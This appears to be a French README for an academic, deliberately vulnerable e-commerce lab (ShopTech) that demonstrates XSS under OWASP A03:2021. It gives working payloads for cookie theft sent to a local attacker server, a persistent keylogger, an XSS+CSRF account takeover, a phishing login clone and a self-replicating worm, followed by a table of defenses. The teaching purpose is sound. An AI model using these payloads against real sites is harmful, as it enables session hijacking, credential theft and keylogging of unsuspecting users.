# 🛡️ XSS Demo — ShopTech

> Projet académique de démonstration des vulnérabilités **Cross-Site Scripting (XSS)**  
> et des attaques associées sur une application e-commerce fictive.  
> Réalisé dans le cadre d'un cours de sécurité applicative — **OWASP A03:2021**

---

## 📋 Table des matières

- [Présentation](#présentation)
- [Architecture du projet](#architecture-du-projet)
- [Installation](#installation)
- [Comptes de démonstration](#comptes-de-démonstration)
- [Attaques démontrées](#attaques-démontrées)
  - [1. Reflected XSS](#1-reflected-xss)
  - [2. Stored XSS — 4 niveaux](#2-stored-xss--4-niveaux)
  - [3. DOM-based XSS](#3-dom-based-xss)
  - [4. Phishing XSS — Clone de page de connexion](#4-phishing-xss--clone-de-page-de-connexion)
  - [5. XSS Worm — Ver auto-répliquant](#5-xss-worm--ver-auto-répliquant-inspiré-du-ver-samy-2005)
- [Dashboard attaquant](#dashboard-attaquant)
- [Défenses implémentées](#défenses-implémentées)
- [Avertissement légal](#avertissement-légal)

---

## Présentation

**ShopTech** est une application e-commerce intentionnellement vulnérable, conçue pour illustrer les différents types d'attaques XSS dans un environnement contrôlé.

Elle se compose de deux serveurs :

| Serveur | Port | Rôle |
|---------|------|------|
| `app.py` | 5000 | Application ShopTech (victime) |
| `attacker_server.py` | 8000 | Serveur de l'attaquant + Dashboard |

---

## Architecture du projet

```
XSS-demo-shoptech/
├── app.py                  ← Application Flask principale (ShopTech)
├── attacker_server.py      ← Serveur attaquant avec dashboard de collecte
├── requirements.txt        ← Dépendances Python
├── rapport-bandit.html     ← Rapport d'analyse statique (Bandit)
└── templates/
    ├── base.html           ← Template de base (navbar, footer)
    ├── index.html          ← Page d'accueil (catalogue produits)
    ├── login.html          ← Page de connexion
    ├── register.html       ← Page d'inscription
    ├── search.html         ← Recherche (Reflected XSS)
    ├── product.html        ← Fiche produit (Stored XSS + CSRF)
    ├── profile.html        ← Profil utilisateur (DOM-based XSS)
    └── checkout.html       ← Paiement (cible du keylogger)
```

---

## Installation

### Prérequis

- Python 3.10+
- pip

### Étapes

```bash
# 1. Cloner le dépôt
git clone https://github.com/<votre-compte>/XSS-demo-shoptech.git
cd XSS-demo-shoptech

# 2. Installer les dépendances
pip install -r requirements.txt

# 3. Lancer le serveur ShopTech (Terminal 1)
python app.py

# 4. Lancer le serveur attaquant (Terminal 2)
python attacker_server.py
```

Ouvrir ensuite dans le navigateur :
- **ShopTech** → http://localhost:5000
- **Dashboard attaquant** → http://localhost:8000/dashboard

> ⚠️ Utiliser **Google Chrome** ou **Microsoft Edge** pour les tests.  
> Firefox peut bloquer certaines requêtes cross-port sur localhost.

---

## Comptes de démonstration

| Utilisateur | Mot de passe | Rôle |
|-------------|-------------|------|
| `alice` | `password` | Victime |
| `bob` | `password` | Attaquant |
| `admin` | `password` | Administrateur |

---

## Attaques démontrées

---

### 1. Reflected XSS

**Fichier concerné :** `templates/search.html`  
**Point d'entrée :** paramètre `q` de la route `/search`  
**Caractéristique :** le payload n'est jamais stocké — il rebondit directement dans la réponse HTTP.

#### 1.1 — Proof of Concept (popup)

Coller directement dans la barre d'adresse :

```
http://localhost:5000/search?q=<script>alert('XSS')</script>
```

#### 1.2 — Vol de cookie silencieux

Utiliser la barre de recherche du site et saisir :

```html
<img src=x onerror="new Image().src='http://localhost:8000/steal?c='+document.cookie+'&src=reflected'">
```

→ Le cookie de session de la victime apparaît sur le **dashboard attaquant** dans la section 🍪 Cookies volés.

**Exploitation du cookie :**  
L'attaquant injecte le cookie dans son navigateur via la console F12 :
```javascript
document.cookie = "session=<valeur_volée>; path=/"
```
Il recharge la page et est connecté en tant que la victime, sans mot de passe.

---

### 2. Stored XSS — 4 niveaux

**Fichier concerné :** `templates/product.html`  
**Point d'entrée :** champ "Votre avis" sur une fiche produit  
**Caractéristique :** le payload est stocké en base SQLite et s'exécute pour **chaque visiteur**.

> ⚠️ **Important :** l'attaquant (bob) doit se déconnecter immédiatement après avoir publié l'avis, avant que la page se recharge, pour éviter que le script s'exécute sur sa propre session.

#### Niveau 1 — Proof of Concept

```javascript
<script>alert("XSS — cookie: " + document.cookie)</script>
```

→ Une popup affiche le cookie de chaque visiteur.

#### Niveau 2 — Vol de cookie silencieux

```javascript
<script>new Image().src="http://localhost:8000/steal?c="+document.cookie+"&src=stored"</script>
```

→ Aucun signe visible. Cookie capturé en temps réel sur le dashboard.

#### Niveau 3 — Keylogger persistant (style Magecart)

```javascript
<script>var kl='document.addEventListener("keypress",function(e){new Image().src="http://localhost:8000/steal?k="+encodeURIComponent(e.key)+"&src="+location.pathname})';localStorage.setItem("__ks",kl);eval(kl)</script>
```

→ Après avoir visité la fiche produit, la victime est keyloggée sur **toutes les pages** du site (notamment `/checkout`). Chaque touche apparaît sur le dashboard dans la section ⌨️ Keylogger.

#### Niveau 4 — Chaîne XSS + CSRF (Account Takeover)

```javascript
<script>fetch("/account/change-email",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:"attaquant@evil.com"}),credentials:"include"});fetch("/account/change-password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({password:"hacked123"}),credentials:"include"})</script>
```

→ Dès que la victime visite la fiche produit, son email et mot de passe sont modifiés silencieusement.  
Vérification : se déconnecter puis tenter `alice / hacked123` → connexion réussie.

---

### 3. DOM-based XSS

**Fichier concerné :** `templates/profile.html`  
**Point d'entrée :** fragment `#` de l'URL (`window.location.hash`)  
**Caractéristique :** le payload ne passe **jamais par le serveur** — les logs sont vierges.

#### 3.1 — Proof of Concept

```
http://localhost:5000/profile#<img src=x onerror="alert('DOM XSS — pas de log serveur!')">
```

#### 3.2 — Vol de cookie

```
http://localhost:5000/profile#<img src=x onerror="new Image().src='http://localhost:8000/steal?c='+document.cookie+'&src=dom'">
```

→ Observer les logs du Terminal 1 : seul `GET /profile HTTP/1.1 200` apparaît — aucune trace du payload. C'est la forme la plus **furtive** des trois types de XSS.

---

### 4. Phishing XSS — Clone de page de connexion

**Point d'entrée :** champ "Votre avis" sur une fiche produit  
**Caractéristique :** remplace entièrement la page par un clone Bootstrap identique de la page de connexion ShopTech pour voler les credentials en clair.

#### Payload

```html
<img src=x onerror="document.open();document.write(`<!DOCTYPE html><html lang=fr><head><meta charset=UTF-8><meta name=viewport content='width=device-width,initial-scale=1'><title>Connexion — ShopTech</title><link href=https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css rel=stylesheet><link href=https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css rel=stylesheet><style>:root{--st-primary:#0d6efd;--st-dark:#0a0a23}body{background:#f8f9fa}.navbar{background:var(--st-dark)!important}.navbar-brand{font-weight:800;font-size:1.4rem;letter-spacing:-.5px;color:#fff!important}.navbar-brand span{color:var(--st-primary)}.nav-link{color:rgba(255,255,255,.75)!important}.nav-link:hover{color:#fff!important}footer{background:var(--st-dark);color:rgba(255,255,255,.5);font-size:.85rem}</style></head><body><nav class=navbar navbar-expand-lg navbar-dark><div class=container><a class=navbar-brand href=#>Shop<span>Tech</span></a><ul class='navbar-nav ms-auto align-items-center gap-1'><li class=nav-item><a class=nav-link href=#><i class='bi bi-box-arrow-in-right'></i> Connexion</a></li><li class=nav-item><a class='btn btn-primary btn-sm' href=#>Inscription</a></li></ul></div></nav><main><div class='container py-5'><div class='row justify-content-center'><div class='col-md-5 col-lg-4'><div class='card shadow-sm border-0'><div class='card-body p-4'><h2 class='fw-bold mb-1 text-center'>Connexion</h2><p class='text-muted text-center small mb-4'>Accédez à votre espace ShopTech</p><div class='alert alert-warning py-2'><i class='bi bi-shield-lock me-1'></i> Votre session a expiré. Veuillez vous reconnecter.</div><form action=http://localhost:8000/credentials method=GET><div class=mb-3><label class='form-label fw-semibold'>Nom d'utilisateur</label><input type=text name=username class=form-control placeholder=alice required autofocus></div><div class=mb-4><label class='form-label fw-semibold'>Mot de passe</label><input type=password name=password class=form-control placeholder='••••••••' required></div><button type=submit class='btn btn-primary w-100 fw-semibold'><i class='bi bi-box-arrow-in-right me-1'></i> Se connecter</button></form><hr class=my-3><p class='text-center small text-muted mb-0'>Pas encore de compte ? <a href=# class='text-primary fw-semibold'>Inscription</a></p></div></div></div></div></div></main><footer class='py-4 mt-5'><div class='container text-center'><p class=mb-1>© 2024 ShopTech — Projet de démonstration XSS / OWASP A03:2021</p></div></footer><script src=https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js></script></body></html>`);document.close()">
```

#### Flux d'attaque

```
1. Victime visite la fiche produit
2. La page est entièrement remplacée par un clone de la page de connexion
3. Bannière "Session expirée" → victime saisit ses identifiants
4. GET http://localhost:8000/credentials?username=alice&password=...
5. Serveur attaquant capture → redirige vers http://localhost:5000/login
6. Victime se reconnecte sur le vrai site (sans rien soupçonner)
7. Dashboard : credentials en clair dans la section 🎣 Phishing XSS
```

---

## Dashboard attaquant

Accessible sur **http://localhost:8000/dashboard**

| Section | Contenu |
|---------|---------|
| 🍪 Cookies volés | Cookies de session capturés (Reflected + Stored XSS) |
| ⌨️ Keylogger | Frappes clavier capturées (Stored XSS niveau 3) |
| 🎣 Phishing XSS | Identifiants saisis sur le faux formulaire |
| 👤 Account Takeover | Prises de contrôle via chaîne XSS+CSRF |
| 🪱 XSS Worm | Propagations automatiques du ver sur tous les produits |

---


---

### 5. XSS Worm — Ver auto-répliquant (inspiré du ver Samy, 2005)

**Fichier concerné :** `worm.js` (servi par `attacker_server.py`)  
**Point d'entrée :** champ "Votre avis" sur une fiche produit  
**Caractéristique :** le ver se **propage automatiquement** sur tous les produits du site dès qu'une victime connectée visite un produit infecté — sans aucune autre interaction.

#### Contexte historique

En 2005, Samy Kamkar a injecté un ver XSS sur MySpace qui s'est propagé à **1 million de comptes en moins de 20 heures**, en s'auto-copiant dans le profil de chaque visiteur.

#### Payload d'injection (à coller dans un avis produit)

```html
<script src="http://localhost:8000/worm.js"></script>
```

#### Mécanisme en 4 étapes

```
Étape 1 — Vol du cookie
  └→ GET http://localhost:8000/steal?c=<cookie>&src=worm

Étape 2 — Récupération de la liste des produits
  └→ GET http://localhost:5000/api/products

Étape 3 — Propagation automatique
  └→ POST /product/1  body: review=<script src="http://localhost:8000/worm.js"></script>
  └→ POST /product/2  body: review=<script src="http://localhost:8000/worm.js"></script>
  └→ POST /product/3  ...  (tous les produits du site)

Étape 4 — Notification du dashboard
  └→ POST http://localhost:8000/exfil  type=worm
```

#### Ce que la victime déclenche sans le savoir

1. Alice (connectée) visite le produit 1 infecté
2. `worm.js` s'exécute dans son contexte — avec **sa session**
3. Le worm poste l'avis malveillant sur **tous les autres produits** en son nom
4. Désormais, tout visiteur de n'importe quel produit déclenche le worm à son tour

#### Dashboard attaquant

Section **🪱 XSS WORM** : chaque propagation apparaît avec l'heure, l'IP et le produit infecté.

---
## Défenses implémentées

Chaque vulnérabilité dispose de sa contre-mesure commentée dans le code :

| Vulnérabilité | Défense | Localisation |
|---------------|---------|--------------|
| Reflected XSS | Échappement automatique Jinja2 (supprimer `\| safe`) | `search.html` |
| Stored XSS | `bleach.clean(content, tags=[], strip=True)` | `app.py` route `/product` |
| DOM-based XSS | Ne jamais injecter `location.hash` dans le DOM | `profile.html` |
| Vol de cookie | `SESSION_COOKIE_HTTPONLY = True` | `app.py` config |
| CSRF | Token CSRF dans chaque formulaire | `app.py` routes account |
| Session Hijacking | `SESSION_COOKIE_SAMESITE = "Strict"` | `app.py` config |

---

## Avertissement légal

> Ce projet est **strictement éducatif**.  
> Les techniques présentées ne doivent être utilisées que sur des systèmes vous appartenant  
> ou dans le cadre d'un test d'intrusion autorisé par écrit.  
> Toute utilisation malveillante est illégale et passible de poursuites pénales.

---

*Projet réalisé dans le cadre d'un cours de sécurité applicative — OWASP Top 10 A03:2021*
